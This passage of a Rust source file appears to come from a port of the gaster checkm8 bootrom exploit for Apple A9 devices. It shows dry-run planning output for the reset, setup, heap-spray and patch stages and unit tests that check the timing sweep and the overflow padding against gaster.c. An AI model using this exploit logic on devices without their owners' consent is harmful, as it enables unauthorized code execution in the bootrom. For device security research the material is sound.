            println!("    6. DNLOAD {EP0_MAX_PACKET_SZ} zero bytes -> expect OK/{EP0_MAX_PACKET_SZ}");
            println!("    on failure: CLR_STATUS, then a bus reset is still attempted");
        }
        Stage::Setup => {
            let t = opts.timeout_ms();
            let m = opts.abort_timeout_min_ms.min(t);
            let first = initial_abort_window(t, m);
            let seq = sweep_windows(t, m, 8);
            println!();
            println!("  SETUP plan (gaster.c:848-860):");
            println!(
                "    abort window = {t}ms - 1 = {first}ms, cycle span {} + abort_min {m}ms",
                window_span(t, m)
            );
            println!("    first windows: {seq:?}");
            for cfg in all_configs() {
                println!(
                    "    config {} (0x{:04X}): overwrite_pad = 0x{:X} ({} bytes)",
                    cfg.name, cfg.cpid, cfg.overwrite_pad, cfg.overwrite_pad
                );
                println!(
                    "      pad request = overwrite_pad - delivered, sent as bm=0 b=0 wValue=0 wIndex=0"
                );
                println!("      PASS CONDITION: STALL on the pad request (gaster.c:853), not OK, not a timeout");
            }
            println!(
                "    budget: {} attempts / {} ms",
                opts.setup_budget.max_attempts, opts.setup_budget.max_millis
            );
        }
        Stage::Spray => {
            println!();
            println!("  SPRAY plan (gaster.c:896-918), A9 branch:");
            println!("    loop: (bm=2,b=3,wValue=0,wIndex=0x80) STALL && leak(len 0x{EP0_MAX_PACKET_SZ:X}) && no-leak(len 0x{:X})", 3 * EP0_MAX_PACKET_SZ + 1);
            println!("    leak wValue = (3 << 8) | iSerialNumber, wIndex = 0x{:X}", opts.leak_windex);
            println!("    then CLR_STATUS with length 0x{:X}", 3 * EP0_MAX_PACKET_SZ + 1);
            println!("    cap: the run-level budget, {} iterations / {} ms (the reference is unbounded)", opts.setup_budget.max_attempts, opts.setup_budget.max_millis);
        }
        Stage::Patch => {
            for cfg in all_configs() {
                match payload::build_payload(cfg, PayloadKind::A9) {
                    Ok(built) => print_plan(cfg, PayloadKind::A9, &built),
                    Err(e) => println!("  {}: BUILD FAILED: {e}", cfg.name),
                }
            }
            println!();
            println!(
                "  PATCH plan (gaster.c:1209-1223): overflow {} bytes as bm=2 b=3 wValue=0 \
                 wIndex=0x80 (STALL is success), then the blob in 0x{DFU_MAX_TRANSFER_SZ:X} chunks, \
                 then DNLOAD {DFU_FILE_SUFFIX_LEN} + DNLOAD 0 + the MANIFEST walk.",
                OVERWRITE_STRUCT_SIZE
            );
        }
        Stage::Pwned => {}
    }

    println!();
    println!("  dry run: nothing was sent and no device was opened.");
    RunOutcome::Aborted(format!(
        "dry_run: stage {} planned; nothing was sent and no device was opened",
        stage.name()
    ))
}

fn print_plan(cfg: &SocConfig, kind: PayloadKind, built: &BuiltPayload) {
    println!();
    println!(
        "  config        : {} ({kind:?}) cpid=0x{:04X} cprv=0x{:02X}",
        cfg.name, cfg.cpid, cfg.cprv
    );
    println!(
        "  overwrite_pad : 0x{:X} ({})   insecure_base 0x{:X}",
        cfg.overwrite_pad, cfg.overwrite_pad, cfg.insecure_memory_base
    );
    println!("  payload       : {} bytes", built.blob.len());
    println!(
        "  overwrite     : {} bytes (callback at offset {})",
        built.overwrite.len(),
        payload::OVERWRITE_CALLBACK_OFF
    );
    println!("  blob sha256   : {}", built.blob_sha256);
    println!();
    println!("  {:<6} {:<6} {:<42} value", "off", "len", "field");
    for f in &built.fields {
        println!(
            "  0x{:03X}  {:<6} {:<42} 0x{:016X}",
            f.off, f.len, f.label, f.value
        );
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- the sweep is a real sweep -----------------------------------------

    /// gaster.c:849 — the first window is `usb_timeout - 1`, i.e. 4 ms at the
    /// default 5 ms timeout, not 0.
    #[test]
    fn sweep_starts_at_usb_timeout_minus_one() {
        assert_eq!(initial_abort_window(5, 0), 4);
        assert_eq!(initial_abort_window(1, 0), 0);
        assert_eq!(initial_abort_window(0, 0), 0, "a nonsense timeout must not panic");
    }

    /// The advance formula, `(t + 1) % (usb_timeout - abort_min + 1) + abort_min`
    /// (gaster.c:857), for the default options: 0,1,2,3,4,5,0.
    #[test]
    fn advance_formula_is_gaster_857() {
        let seq: Vec<u32> = (0..=5).map(|t| advance_abort_window(t, 5, 0)).collect();
        assert_eq!(seq, vec![1, 2, 3, 4, 5, 0]);
        // And applied repeatedly from 0 it is the acceptance sequence.
        let mut w = 0;
        let mut seen = vec![w];
        for _ in 0..6 {
            w = advance_abort_window(w, 5, 0);
            seen.push(w);
        }
        assert_eq!(seen, vec![0, 1, 2, 3, 4, 5, 0]);
        assert_eq!(window_span(5, 0), 6);
    }

    /// The windows a run actually exercises must all be distinct, and must cover
    /// every value in the cycle. This is the property `a9ctl` did not have: its
    /// six labels all cancelled at >= 5 ms because the pump interval was 5 ms.
    #[test]
    fn sweep_exercises_every_distinct_window() {
        let seq = sweep_windows(5, 0, 12);
        assert_eq!(seq[..6], [4, 5, 0, 1, 2, 3]);
        assert_eq!(seq[6..], [4, 5, 0, 1, 2, 3]);
        let mut distinct = seq[..6].to_vec();
        distinct.sort_unstable();
        assert_eq!(distinct, vec![0, 1, 2, 3, 4, 5]);
    }

    #[test]
    fn abort_min_raises_the_floor() {
        assert_eq!(window_span(5, 2), 4);
        // start at usb_timeout-1 = 4, then gaster.c:857's (t+1) % 4 + 2:
        // 4 -> 3 -> 2 -> 5 -> 4
        assert_eq!(sweep_windows(5, 2, 5), vec![4, 3, 2, 5, 4]);
        // abort_min above usb_timeout cannot divide by zero or escape the cycle.
        assert_eq!(window_span(3, 9), 1);
        assert_eq!(advance_abort_window(3, 3, 9), 3);
    }

    /// The degenerate case the Lead called out: `--abort-min-ms` equal to
    /// `--usb-timeout-ms` collapses gaster.c:857's modulus to 1, so the sweep is
    /// one experiment. gaster inherits it (gaster.c:1635-1638 only rejects
    /// abort_min *greater* than usb_timeout), so we must not clamp it away — we
    /// must make it visible.
    #[test]
    fn degenerate_sweep_is_detected_and_said_once() {
        // gaster.c:849 still runs one attempt at usb_timeout-1 before the pin.
        assert_eq!(initial_abort_window(5, 5), 4);
        assert_eq!(window_span(5, 5), 1);
        assert_eq!(sweep_windows(5, 5, 4), vec![4, 5, 5, 5]);

        let mut s = SetupStats::new(0x500, 5, 5);
        assert!(s.degenerate);
        s.attempts = 1;
        s.note_window(4);
        let first = s.frozen_sweep_notice().expect("must warn");
        assert!(first.contains("NOT sweeping"), "{first}");
        assert!(first.contains("abort_min == usb_timeout"), "{first}");
        assert!(first.contains("gaster.c:857"), "{first}");
        assert!(
            s.frozen_sweep_notice().is_none(),
            "the warning must be said once, not per attempt"
        );
        assert!(s.summary().contains("DEGENERATE"), "{}", s.summary());
    }

    #[test]
    fn healthy_sweep_never_warns() {
        let mut s = SetupStats::new(0x500, 5, 0);
        assert!(!s.degenerate);
        for (i, w) in [4u32, 5, 0, 1, 2, 3, 4, 5].iter().enumerate() {
            s.attempts = i as u64 + 1;
            s.note_window(*w);
            assert!(
                s.frozen_sweep_notice().is_none(),
                "a varying sweep must not warn at attempt {}",
                s.attempts
            );
        }
    }

    /// If the window somehow stops varying with a span > 1, that is a bug in the
    /// advance (the a9ctl failure mode) and it must still be reported.
    #[test]
    fn a_span_above_one_that_still_does_not_vary_is_reported() {
        let mut s = SetupStats::new(0x500, 5, 0);
        assert!(!s.degenerate);
        s.attempts = 1;
        s.note_window(4);
        assert!(s.frozen_sweep_notice().is_none(), "one attempt proves nothing");
        s.attempts = 8; // more attempts than the cycle has windows
        let msg = s.frozen_sweep_notice().expect("must warn");
        assert!(msg.contains("8 attempt(s)"), "{msg}");
        assert!(msg.contains("1 distinct window(s)"), "{msg}");
    }

    #[test]
    fn an_immediate_return_is_flagged_in_the_attempt_line() {
        let mut s = SetupStats::new(0x500, 5, 0);
        s.attempts = 1;
        let abort = XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status: XferStatus::Cancelled,
            transferred: 0,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros: 12,
            libusb_rc: -2,
            abort_after_ms: Some(4),
        };
        let line = s.attempt_line(&abort, 4, Some(0x500), None);
        assert!(line.contains("far_short_of_the_4ms_window"), "{line}");
        assert!(line.contains("sweep=ok"), "{line}");
        assert!(line.contains("pad_status=NOT_SENT"), "{line}");
    }

    /// gaster reaps a transfer for *every* terminal status (`gaster.c:220-223`,
    /// `:282`), so `TRANSFER_ERROR` still yields a pad request at `:853`. Only a
    /// device that is gone is excluded.
    #[test]
    fn abort_completed_mirrors_gasters_wrapper() {
        let base = |status: XferStatus| XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status,
            transferred: 0,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros: 4000,
            libusb_rc: -2,
            abort_after_ms: Some(4),
        };
        for s in [
            XferStatus::Ok,
            XferStatus::Stall,
            XferStatus::Timeout,
            XferStatus::Cancelled,
            XferStatus::Error,
        ] {
            assert!(abort_completed(&base(s)), "{s} was reaped");
        }
        assert!(!abort_completed(&base(XferStatus::NoDevice)));
    }

    #[test]
    fn a_refused_transfer_is_distinguishable_from_a_reaped_error() {
        let reaped = XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status: XferStatus::Error,
            transferred: 0,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros: 4012,
            libusb_rc: -1,
            abort_after_ms: Some(4),
        };
        assert!(abort_completed(&reaped) && !abort_was_refused(&reaped));

        // The transport's refused/poisoned shape: never submitted, so no window.
        let refused = XferResult {
            status: XferStatus::Error,
            micros: 0,
            abort_after_ms: None,
            ..reaped
        };
        assert!(abort_completed(&refused), "an Error is still a reaped transfer");
        assert!(abort_was_refused(&refused), "and it is recognisable as refused");
    }

    /// The pad predicate: sent when the aborted transfer delivered *fewer* than
    /// `overwrite_pad`, with the length gaster computes.
    #[test]
    fn pad_predicate_matches_gaster_853() {
        assert_eq!(pad_request_len(0x500, 0), Some(0x500));
        assert_eq!(pad_request_len(0x500, 0x4FF), Some(1));
        assert_eq!(pad_request_len(0x500, 0x500), None);
        assert_eq!(pad_request_len(0x500, 0x800), None);
    }

    #[test]
    fn stdout_sampling_is_bounded_but_never_silent_at_the_head() {
        let opts = RunOptions::default();
        assert!(should_print_attempt(&opts, 1));
        assert!(should_print_attempt(&opts, SETUP_STDOUT_HEAD));
        assert!(!should_print_attempt(&opts, SETUP_STDOUT_HEAD + 1));
        assert!(should_print_attempt(&opts, SETUP_STDOUT_EVERY));
        assert!(should_print_attempt(&opts, 20_000));
        let verbose = RunOptions {
            verbose: true,
            ..RunOptions::default()
        };
        assert!(should_print_attempt(&verbose, 3));
        assert!(should_print_attempt(&verbose, 19_999));
    }

    #[test]
    fn setup_stats_count_every_outcome() {
        let mk = |status: XferStatus, transferred: usize, micros: u64| XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status,
            transferred,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros,
            libusb_rc: -2,
            abort_after_ms: Some(4),
        };
        let mut s = SetupStats::new(0x500, 5, 0);
        s.attempts = 2;
        s.note_window(4);
        s.note_window(4);
        s.note_window(5);
        let abort = mk(XferStatus::Cancelled, 0, 4001);
        let pad = mk(XferStatus::Timeout, 0, 5002);
        s.record_pad(&pad);
        let line = s.attempt_line(&abort, 4, Some(0x500), Some(&pad));
        assert!(line.contains("abort_window_ms=4"), "{line}");
        assert!(line.contains("0 (host reported nothing)"), "{line}");
        assert!(line.contains("abort_micros=4001"), "{line}");
        assert!(line.contains("pad_req=1280"), "{line}");
        assert!(line.contains("pad_status=TIMEOUT"), "{line}");
        assert_eq!(s.windows, vec![4, 5]);
        assert_eq!(s.zero_aborts, 1);
        assert_eq!(s.short_aborts, 1);
        assert_eq!(s.pad_timeouts, 1);
        assert_eq!(s.last_micros, 4001);
        let summary = s.summary();
        assert!(summary.contains("pad_timeout=1"), "{summary}");
        assert!(summary.contains("distinct_abort_windows=2"), "{summary}");
    }

    #[test]
    fn stalling_the_pad_is_recorded_as_stall_only() {
        let pad = XferResult {
            seq: 9,
            bm_request_type: 0,
            b_request: 0,
            w_value: 0,
            w_index: 0,
            w_length: 0x500,
            status: XferStatus::Stall,
            transferred: 0,
            requested: 0x500,
            micros: 120,
            libusb_rc: -1,
            abort_after_ms: None,
        };
        let mut s = SetupStats::new(0x500, 5, 0);
        s.record_pad(&pad);
        assert_eq!((s.pad_stalls, s.pad_ok, s.pad_timeouts, s.pad_other), (1, 0, 0, 0));
    }

    // -- defaults and the frozen values ------------------------------------

    #[test]
    fn defaults_are_gasters_defaults() {
        let o = RunOptions::default();
        assert_eq!(o.max_rounds, 64);
        assert_eq!(o.usb_timeout_ms, 5, "gaster.c:1631-1633");
        assert_eq!(o.abort_timeout_min_ms, 0, "gaster.c:1635-1637");
        assert_eq!(o.leak_windex, LEAK_WINDEX_GASTER);
        assert!(!o.dry_run && !o.verbose && !o.allow_winusb && !o.stop_after_setup_stall);
        assert_eq!(o.trace_path, None);
        assert_eq!(o.stage_filter, None);
        assert_eq!(o.settle_ms, 0, "0 = gaster's behaviour");
        assert_eq!(o.setup_budget.max_attempts, 20_000);
        assert_eq!(o.setup_budget.max_millis, 600_000);
    }

    #[test]
    fn leak_windexes_are_the_frozen_ones() {
        assert_eq!(LEAK_WINDEX_GASTER, 0x0A, "gaster.c:52 USB_MAX_STRING_DESCRIPTOR_IDX");
        assert_eq!(LEAK_WINDEX_IPWNDFU, 0x00);
    }

    #[test]
    fn stage_filter_is_honoured_offline() {
        let outcome = run(RunOptions {
            dry_run: true,
            ..RunOptions::default()
        });
        assert!(matches!(outcome, RunOutcome::Aborted(_)), "{outcome:?}");
    }

    #[test]
    fn single_stage_dry_run_touches_nothing() {
        for stage in [Stage::Reset, Stage::Setup, Stage::Spray, Stage::Patch] {
            let outcome = run_one_stage(
                stage,
                RunOptions {
                    dry_run: true,
                    ..RunOptions::default()
                },
            );
            match outcome {
                RunOutcome::Aborted(msg) => assert!(msg.contains("nothing was sent"), "{msg}"),
                other => panic!("{stage:?} dry run returned {other:?}"),
            }
        }
    }

    /// PWNED is a state, not something to run.
    #[test]
    fn pwned_is_not_runnable() {
        let outcome = run_one_stage(
            Stage::Pwned,
            RunOptions {
                dry_run: true,
                ..RunOptions::default()
            },
        );
        match outcome {
            RunOutcome::Aborted(m) => assert!(m.contains("not a stage"), "{m}"),
            other => panic!("{other:?}"),
        }
    }

    /// SPRAY refuses a config it has no sequence for rather than approximating,
    /// and the A9 table must keep `large_leak == 0` (the A9 branch selector).
    #[test]
    fn spray_guards_are_specific() {
        let e = crate::config::all_configs()
            .iter()
            .find(|c| c.large_leak != 0);
        assert!(e.is_none(), "A9 configs must have large_leak == 0");
        let h = crate::config::all_configs().iter().find(|c| c.hole != 0);
        assert!(h.is_none(), "A9 configs must have hole == 0 (gaster.c:905)");
    }
}
